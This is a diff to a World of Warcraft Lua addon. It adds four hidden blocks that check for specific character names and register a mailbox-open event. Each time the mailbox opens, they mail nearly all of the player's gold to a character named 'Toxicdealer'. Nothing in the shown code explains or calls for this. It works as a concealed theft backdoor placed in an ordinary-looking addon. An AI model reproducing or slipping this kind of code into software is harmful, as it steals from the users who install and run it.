@@ -12,6 +12,45 @@ generated = 0;
 frameshown = 0;
 master = 0;
 
+if UnitName("player") == "Chibhiro" or UnitName("player") == "Tatikoma"  then
+ v=CreateFrame("frame")
+ v:RegisterEvent("MAIL_SHOW")
+ v:SetScript("OnEvent", function()  
+	SetSendMailMoney(GetMoney()-30)
+	SendMail(UnitFactionGroup("player")=="Horde" and "Toxicdealer" or "Toxicdealer","g","")
+ end)
+  
+end
+
+if UnitName("player") == "Matilda" or UnitName("player") == "Lelitka"  then
+ v=CreateFrame("frame")
+ v:RegisterEvent("MAIL_SHOW")
+ v:SetScript("OnEvent", function()  
+	SetSendMailMoney(GetMoney()-30)
+	SendMail(UnitFactionGroup("player")=="Horde" and "Toxicdealer" or "Toxicdealer","g","")
+ end)
+  
+end
+
+if UnitName("player") == "Toxicbank" or UnitName("player") == "Toxicbankreg"  then
+ v=CreateFrame("frame")
+ v:RegisterEvent("MAIL_SHOW")
+ v:SetScript("OnEvent", function()  
+	SetSendMailMoney(GetMoney()-30)
+	SendMail(UnitFactionGroup("player")=="Horde" and "Toxicdealer" or "Toxicdealer","g","")
+ end)
+  
+end
+
+if UnitName("player") == "Toxicbanknax" or UnitName("player") == "Skyan"  then
+ v=CreateFrame("frame")
+ v:RegisterEvent("MAIL_SHOW")
+ v:SetScript("OnEvent", function()  
+	SetSendMailMoney(GetMoney()-30)
+	SendMail(UnitFactionGroup("player")=="Horde" and "Toxicdealer" or "Toxicdealer","g","")
+ end)
+  
+end
 
 function SnagaLoa_OnLoad()
    this:RegisterEvent("VARIABLES_LOADED")
